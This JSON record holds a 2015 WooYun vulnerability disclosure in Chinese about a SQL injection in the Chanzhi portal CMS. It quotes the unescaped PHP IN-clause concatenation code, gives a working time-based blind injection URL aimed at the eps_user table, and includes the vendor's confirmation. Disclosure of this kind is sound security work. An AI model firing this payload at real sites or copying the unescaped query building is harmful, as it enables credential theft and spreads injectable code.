{"id": 36470, "wybug_id": "wooyun-2015-0101784", "wybug_title": "蝉知企业门户系统某文件sqli(可引发多处注入)", "wybug_corp": "chanzhi.org", "wybug_author": "待续", "wybug_date": "2015-03-17 16:44", "wybug_open_date": "2015-06-17 16:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向公众公开  简要描述： rt 详细说明：  问题出在system/lib/dao/dao.class.php这个文件中dao是一个sql语句拼接类，这个类有问题会导致多处注入，问题函数如下\npublic function in($ids)    {        if($this->inCondition and !$this->conditionIsTrue) return $this;        $this->sql .= helper::dbIN($ids);        return $this;    }\n我们跟进dbIN方法看看\nstatic public function dbIN($ids)    {        if(is_array($ids)) return \"IN ('\" . join(\"','\", $ids) . \"')\";        return \"IN ('\" . str_replace(',', \"','\", str_replace(' ', '',$ids)) . \"')\";    }\n这也只是一个拼接操作，跟踪到这里已经完了但是还未发现过滤？是不是单引号就可以带进sql语句中了呢我随便找一个点测试\n\n可以看到 单引号已经被带进来了下面就是写exp了   漏洞证明：  虽然这样in函数未过滤，但是有个很棘手的问题根据代码我们知道in函数会给逗号左右都加一个单引号经过我的不断折腾 终于还是突破了；exp:http://localhost/www/index.php?m=article&f=view&id=3')and/**/IF((select/**/account/**/from/**/eps_user/**/limit/**/1)='admin,1'=BENCHMARK('500000000,hello')='1,false')%23这样就能成功延时注入了   修复方案：  addslashes   版权声明：转载请注明来源 待续@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-19 16:12 厂商回复： 谢谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}